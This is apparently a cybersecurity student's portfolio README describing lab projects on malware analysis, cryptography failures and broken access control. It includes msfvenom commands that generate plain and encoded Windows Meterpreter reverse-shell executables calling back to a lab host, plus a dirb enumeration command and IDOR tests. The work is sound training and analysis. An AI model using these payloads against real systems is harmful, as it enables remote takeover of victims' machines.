Welcome to my cybersecurity porfolio. This repository documents my learning journeys, technical skills, and projects throughout my studies.

## About Me

Hi! My name is Michelle, and I am a student with a strong interest in cybersecurity. I am currently focused on learning Red Teaming, penetration testing, and offensive security concepts while continuously expanding my understanding of cybersecurity practices.

Although my current professional background is in content creation, I really enjoy exploring this field and challenging myself to learn new technical skills. Cybersecurity has become a career path that I am actively pursuing for my future professional development.

## Technical Skills

# Tools:
- Kali linux
- Network Analysis: Wireshark
- Penetration Testing: BurpSuite
- Malware: Cuckoo Sandbox, Tria.ge, VirusTotal

# Cybersecurity topics:
Malware: Knowing malware types, payload behavior, and analysis concept
Cryptography Failures: Understanding weak encryption, insecure password, sensitive data exposure, and security risk
Broken Access Control: Learning about authorization weaknesses such as IDOR, privilege escalation, role misconfiguration, and access control bypass

## Project Experience

# Project 1: Malware
[Michelle Angela D._CS6_Day26.pdf](https://github.com/user-attachments/files/28426998/Michelle.Angela.D._CS6_Day26.pdf)

METHODOLOGY
- Enviroment Set Up: Kali Linux as attacker, Windows as target, Host-only adapter in VirtualBox
- Malware Creation: Making 2 different payloads with MSFvenom. PAYLOAD.exe and PAYLOAD-encoded.exe (using the shikata_ga_nai)
- Static Analysis: MD5 Hash analysis, strings metadata analysis and suspicious strings, VirusTotal analysis to compare decision rate
- Dynamic Analysis: using Cuckoo and Tria.ge to observation behavioral activity, risk score, and Mitre Att&ck Mapping
- IoC Identification & Report: compiled into a technical report along with security mitigation recommendations

TECHNICAL LOGS
- Payload Commands
PAYLOAD.exe:
'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.3 LPORT=4444 -f exe -o WindowsTest.exe'
Output: Payload sizes, Final size, Saved as

PAYLOAD-encoded.exe:
'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.3 LPORT=4444 -e x86/shikata_ga_nai -f exe -o WindowsTest-encoded.exe'
Output: Payload sizes, Final size, Saved as

- Hash Analysis
md5sum WindowsTest.exe
md5sum WindowsTest-encoded.exe

- Strings Analysis
strings WindowsTest.exe
Output: KERNEL32.DLL, VirtualProtect, !This program cannot be run in DOS mode.

strings WindowsTest-encoded.exe
Output: KERNEL32.DLL, VirtualProtect, !This program cannot be run in DOS mode.

- Static Analysis
VirusTotal results:
WindowsTest.exe          55/71
WindowsTest-encoded.exe  48/70

- Dynamic Analysis
Cuckoo Sandbox:
Risk Score 10/10
Behavioral Detection 1

Tria.ge:
Risk Score 10/10
MITRE ATT&CK 2 technicques
Category Discovery

REPORT
Based on the results of static analysis and dynamic analysis, both the standard and encoded payloads demonstrated characteristics of high-risk executable files.

During static analysis, both files were identified as Windows PE executables with different detection rates: 55/71 for the standard payload and 48/70 for the encoded payload. The encoding process affected the detection rate but did not alter the fundamental executable file structure.

During dynamic analysis using Cuckoo Sandbox and Tria.ge, both payloads received a risk score of 10/10. Tria.ge also identified 2 MITRE ATT&CK mappings under the Discovery category, indicating system information gathering behavior during payload execution.

The analysis results demonstrate that both payloads exhibit high detection rates during static analysis and high-risk runtime behavior during dynamic analysis.

To reduce the risk of similar malware threats, the following security controls are recommended:
- Patch Management: Regularly update operating systems, applications, and security patches.
- Least Privilege: Restrict user and application permissions based on minimum operational requirements.
- Network Segmentation: Separate network environments to limit lateral malware movement.
- EDR / Antivirus: Implement real-time protection, behavioral detection, and endpoint monitoring.

# Project 2: Cryptography Failures
[Michelle Angela D._CS6_Day17.pdf](https://github.com/user-attachments/files/28426977/Michelle.Angela.D._CS6_Day17.pdf)

METHODOLOGY
- Password and Plaintext Hash
Set up XAMPP, start MySQL and Apache. Next step creating new database (users_plaintext, users_hash)

- Hashing Comparison
Password hashing comparison using plaintext, MD5, and bcrypt

- HTTP vs HTTPS Login
The login testing using:
http “http://testasp.vulnweb.com”
https “https://google.com”

TECHNICAL LOGS
- Password and Plaintext Hash
Services executed in XAMPP: Apache running, MySQL running
Data used: users_plaintext, users_hash

- Hashing Comparison
MD5: password using MD5 Hash, the result is no salt, and fast computation
bcrypt: using bcrypt hash, with salt, and work factor applied

- HTTP vs HTTPS Login
if using Wireshark
http “http://testasp.vulnweb.com”
= username dan password is visible, data transmitted as plaintext

https “https://google.com”
= using TLS encryption, there is no credential, only application data visible

REPORT
Based on the results, plaintext password storage is highly not secured, while MD5 offers limited protection but easy to vulnerable to cracking and data leakage. bcrypt provides stronger security through salt and work factor mechanisms. The other side, HTTP transmits data without encryption, making it easy to intercept. HTTPS uses TLS encryption to securely protect data and communication.

# Project 3: Broken Access Control
[Michelle Angela D._CS6_Day20.pdf](https://github.com/user-attachments/files/28427355/Michelle.Angela.D._CS6_Day20.pdf)

METHODOLOGY
- Using XAMPP Apache & MySQL and a vulnerable dummy application from mentor
- Hidden resource enumeration using 'DIRB' to find hidden directories
- Tested sensitive pages to determine whether resources could be accessed without authentication or authorization
- Parameter manipulation testing on the profile endpoint to see the potential Insecure Direct Object Reference (IDOR) vulnerabilities

TECHNICAL LOGS
- Running service: Apache running, MySQL running

- Hidden Resource Enumeration:
Using command 'dirb http://localhost/broken-access-control-lab/ common.txt', the result is /admin and /system

- Access Without Authorization
The result is admin page can login without any authetication. The impact is U=unauthorized access, sensitive data exposure, and administrative resource disclosure

- IDOR Testing
Testing endpoint: /profile.php?id=1, /profile.php?id=2, /profile.php?id=3
Result: id=1 → profile displayed, id=2 → user not found, id=3 → user not found
The testing showed that parameter can be manipulation, but access to other users' data was not successfully achieved.

REPORT
The testing on the dummy application to identify Broken Access Control vulnerabilities. We can identified hidden resource like /admin and /system that possible to be open. The other side, a backup.zip file was exposing sensitive information (name, username, email). The IDOR testing when doing the parameter manipulation, the result was not successfully achieved to other user accounts.

## Learning Journey
# What I've Learned So Far:
Throughout my cybersecurity learning journey, i have knowledge in web security, network security, Red team and Blue team, and OWASP Top 10 vulnerabilities such as Broken Access Control, SSRF, Session Security, Security Misconfiguration, and Cryptography Failures. 

Also learned reconnaissance, port scanning, and service enumeration using Nmap, Wireshark, BurpSuite, and Kali Linux, while exploring malware fundamentals, CVSS risk score, Secure Authentication Password.

# Improvement:
As a cybersecurity student, still need to improve my knowledge about cybersecurity, like networking and Linux fundamentals, web security such as SQL Injection, broken access control, authentication, learn more about malware analysis, and many more. Also need to gain more practical experience through hands-on labs, CTF challenges, and security tools practice

## Contact Information
Feel free to reach out me
